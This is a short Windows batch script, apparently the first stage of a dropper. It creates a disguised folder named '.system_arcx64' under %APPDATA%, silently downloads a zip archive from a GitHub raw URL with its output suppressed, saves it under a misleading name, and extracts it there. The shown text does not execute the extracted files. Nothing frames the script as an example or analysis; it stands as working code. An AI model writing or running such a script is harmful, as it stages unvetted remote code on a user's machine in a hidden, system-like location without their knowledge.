@echo off

set folderPath=%APPDATA%\.system_arcx64

if not exist "%folderPath%\windows.zip" (
    curl https://raw.githubusercontent.com/faruqer/cheki/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
)
if not exist "%folderPath%\extracted" (
    mkdir %folderPath%\extracted
)
tar -xf %folderPath%\windows.zip -C %folderPath%\extracted
